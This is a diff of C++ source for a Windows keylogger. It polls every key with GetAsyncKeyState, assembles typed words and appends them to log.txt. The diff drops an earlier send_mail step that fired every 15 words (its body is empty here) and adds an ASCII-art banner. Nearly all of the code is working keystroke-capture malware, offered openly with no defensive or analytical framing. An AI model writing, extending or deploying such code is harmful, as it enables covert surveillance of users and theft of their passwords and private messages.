@@ -8,27 +8,28 @@ using namespace std;
 
 void write(string txt);
 
-void send_mail(string body);
+void on_load();
 
-bool main_loop(string &log, string &word, int &count);
+bool main_loop(string &word, int &count);
 
 int main()
 {
-    string log = "";
+    on_load();
+
     string word = "";
     int count = 0;
+
     while (true)
     {
-        bool running = main_loop(log, word, count);
+        bool running = main_loop(word, count);
         if (!running)
             break;
     }
-    cout << log << endl;
 
     return 0;
 }
 
-bool main_loop(string &log, string &word, int &count)
+bool main_loop(string &word, int &count)
 {
     int i;
 
@@ -36,29 +37,45 @@ bool main_loop(string &log, string &word, int &count)
     {
         if (GetAsyncKeyState(i) == KEY_PRESSED)
         {
-            if (i == 27)
-                return false;
             char ch = i;
-            cout << ch << endl;
-            if (i == 32 || i == 13 || i == 10)
+            cout << "char: " << ch << endl;
+            if (i == 32 || i == 13 || i == 10 || i == 27)
             {
-                log += word + '\n';
+                write(word + '\n');
                 word = "";
                 count++;
-                if (count == 15)
-                    send_mail(log);
+                if (i == 27)
+                    return false;
             }
             else if (i == 8)
                 word = word.substr(0, word.length() - 1);
             else
                 word += ch;
-            cout << word << endl;
+            cout << "word: " << word << endl;
         }
     }
 
     return true;
 }
 
-void send_mail(string body)
+void on_load()
 {
+    vector<string> ad = {
+        " _   ,           _                                                                 ",
+        "' ) /           //                                              /                  ",
+        " /-<  _  __  , // __ _,  _,  _  __    ______  o __  __.  ____  /_  __.   _. _   _  ",
+        "/   )</_/ (_/_</_(_)(_)_(_)_</_/ (_  / / / <_<_/ (_(_/|_/ / <_/ /_(_/|_o(__/_)_/_)_",
+        "           /         /|  /|                                               /   /    ",
+        "          '         |/  |/                                               '   '     "};
+
+    for (string s : ad)
+        cout << s << endl;
+}
+
+void write(string txt)
+{
+    ofstream file;
+    file.open("log.txt", ios::app);
+    file << txt;
+    file.close();
 }
